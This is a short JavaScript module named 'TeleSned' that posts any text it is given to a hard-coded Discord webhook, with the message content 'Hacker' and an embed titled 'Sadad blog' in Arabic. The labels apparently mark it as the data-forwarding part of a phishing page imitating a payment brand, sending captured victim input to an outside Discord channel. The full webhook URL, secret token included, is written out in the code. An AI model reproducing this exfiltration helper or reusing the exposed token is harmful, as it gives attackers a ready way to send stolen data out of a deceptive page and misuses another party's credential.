import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322911428797136969/jFFz9Q1UQqzmdFyDxTzKP9h6hfkYfLRtUUg2HuXSK3GtC5F44Mk7Rb7DHjoP6Gvu_h-l",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
